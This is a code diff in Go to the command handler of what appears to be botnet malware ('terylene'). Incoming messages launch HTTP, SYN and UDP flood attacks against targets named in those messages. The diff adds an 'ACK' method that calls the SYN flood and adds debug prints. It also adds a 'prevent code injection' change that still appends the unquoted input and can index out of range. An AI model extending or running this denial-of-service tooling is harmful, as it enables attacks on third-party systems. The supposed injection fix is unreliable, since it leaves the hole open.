@@ -718,6 +718,8 @@ func methodhandler(messages []string) {
 			go attack.HTTP(messages[2], messages[3], messages[4])
 		case "SYN":
 			go attack.SYN(messages[2], messages[3], messages[4])
+		case "ACK":
+			go attack.SYN(messages[2], messages[3], messages[4])
 		case "UDP-VIP":
 			go attack.UDP_VIP(messages[2], messages[3], messages[4])
 		}
@@ -726,18 +728,25 @@ func methodhandler(messages []string) {
 	if len(messages) > 1 {
 		for _, value := range custom_methods {
 			if value.name == messages[1] {
+				fmt.Println(messages)
 				pattern := "\\$([a-zA-Z]+)::([a-zA-Z]+)"
 
 				regexpPattern := regexp.MustCompile(pattern)
 
 				values := []string{value.path}
 
-				for _, i := range messages {
-					if i == "terylene" || i == value.name {
+				for i, frame := range messages {
+					if frame == "terylene" || frame == value.name {
 						continue
 					}
-					values = append(values, i)
+
+					if value.flag_entries[i-1].entrytype == "string" { // IMPORTANT prevent code injection vulnerability
+						values = append(values, fmt.Sprintf("'%s'", frame))
+					}
+					values = append(values, frame)
 				}
+
+				fmt.Println(values)
 
 				// Initialize an index to keep track of which value to replace with
 				valueIndex := 0
@@ -750,6 +759,7 @@ func methodhandler(messages []string) {
 
 					// Replace the placeholder with the corresponding value
 					replacement := values[valueIndex]
+					fmt.Println(values[valueIndex])
 					valueIndex++ // Move to the next value
 					return replacement
 				})
